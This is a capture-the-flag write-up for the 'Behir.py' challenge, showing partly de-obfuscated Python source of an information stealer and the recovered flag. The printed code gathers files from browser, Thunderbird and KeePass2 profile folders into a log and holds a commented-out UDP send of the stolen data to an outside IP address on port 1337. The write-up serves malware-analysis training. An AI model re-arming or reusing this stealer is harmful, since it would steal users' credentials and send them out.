#### Challenge:

The information stealer Behir.py ate everything - including the flag. It should be somewhere in the malware. Be careful though, it's still a dangerous monster.

*Important note: In its default state, the script is "defanged" and shouldn't exfiltrate any stolen information. However, this can easily be changed and you may accidentally harm your computer while solving the challenge. PLEASE make sure that you run this malware in a virtual machine/isolated lab/sandboxed enviornment. The sample file is stored in an encrypted zip with the password "infected". I am not responsible if your sensitive information is stolen.

[behir_py.zip](./behir_py.zip ":ignore")

---

#### Solution:

We are given obfuscated python code. After manual inspection and removal of some useless bogus functions, I was able to edit it to the point where it prints the flag.

```python
tressym = "fa86075165f2630ff80397bf98323716"
lightning = [".chrom"]
adventure = '/'

import os
import subprocess
import socket
import hashlib
import time


def main():
    ranger = int(time.time())
    ## Removed this to be able to run
    # if(str(hashlib.md5(open(__file__, "rb").read()[43:]).hexdigest()) == tressym):
    ether = -1
    crawlingclaw = "who" + "ima"[::ether]
    ether = ether + 1
    owlbear = os.popen(crawlingclaw).read().split('\n')[ether]
    lightning[ether] = lightning[ether] + "iu" + lightning[ether][ether -1] + adventure
    pi = "PI.3.14159265"
    yeti = "pass"
    ether = ether + 1
    ancestral = makesoul(yeti)
    arcane = "_info.log"
    ancestral[ether] = chr(123) + 'n' + makesoul(yeti)[ether].split('n')[ether]
    gold = "stolen" + arcane
    ancestral[ether] = 'w' + pi.split('.')[ether - ether] + ancestral[ether]
    gold = gold.replace('_', '-')
    for torrent in ancestral:
        lightning.append(torrent)
    ether = ether - ether
    lightning.append(".kee" + yeti + '2' + adventure)
    for fire in range(len(lightning)):
        lightning[fire] = lightning[fire].replace('_', '-')
        lightning[fire] = lightning[fire].replace('w', 'W')
    bludgeoning = int(time.time())

    ## Added this to print FLAG
    print(lightning)

    if(bludgeoning - ranger <= 2):
        evocation = len(lightning)
        for castle in range(evocation): #Ya the ".keepass2/" one is ambitious... but I have seen malware do this
            
            ## Removed this because useless
            # devour(lightning[castle], owlbear, gold)
            pass
        
        for aboleth in range(evocation):
            lightning.pop(ether)

        ## Removed this because useless
        # circle("WPI")


def devour(poison, gods, tome):
    ether = -1
    if(poison[ether] == adventure):
        cat = "cat"
        buckler = adventure + "home" + adventure + gods + adventure + poison
        lightning.append(bytes(buckler, "ascii"))
        acid = "find " + buckler + " -type f -exec " + cat + " {} + > " + tome
        os.system(acid)
        spell = open(tome, "rb")
        ate = spell.read()
        spell.close()
        lightning.append(ate)


def circle(viciousMockery):
    roc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for elf in lightning:
        drow = bytes('0', "ascii") #I remove the data, but you REALLY should run this in a sandboxed environment
        
        ## Removed this because useless 
        # roc.sendto(drow, ("158.58.184.213", 1337)) #this is not a nice IP, be careful what you send here


def makesoul(orb):
    soul = []
    litch = soulMore(orb)
    soul.append(litch)
    soul.append(soul[0].lower())
    litch = swords()
    soul[0] = litch + "Ice" + "weasel"
    soul[0] = soul[0] + adventure
    soul[1] = soul[1] + chr(125)
    soul.append(litch + "Thunder" + "bird" + adventure)
    return soul


def soulMore(craft):
    ether = 0
    vampire = ""
    eldritch = ["auto", "fill", craft, "word"]
    eldritch[ether] = eldritch[ether] + eldritch[ether + 1]
    ether = ether + 1
    eldritch[ether] = eldritch[ether + ether] + eldritch[ether + ether + ether]
    eldritch[len(eldritch) - ether] = "NEVER"
    eldritch[len(eldritch) - 2] = "use"
    eldritch = eldritch[::-1]
    for martial in eldritch:
        vampire = vampire + '_'
        vampire = vampire + martial
    return vampire


def swords():
    ether = -1
    return chr(46) + lightning[ether + 1][4:6][::ether] + "zilla" + adventure



main()
```

---

<details><summary>FLAG:</summary>

```
WPI{never-use-passWord-autofill}
```

</details>
<br/>
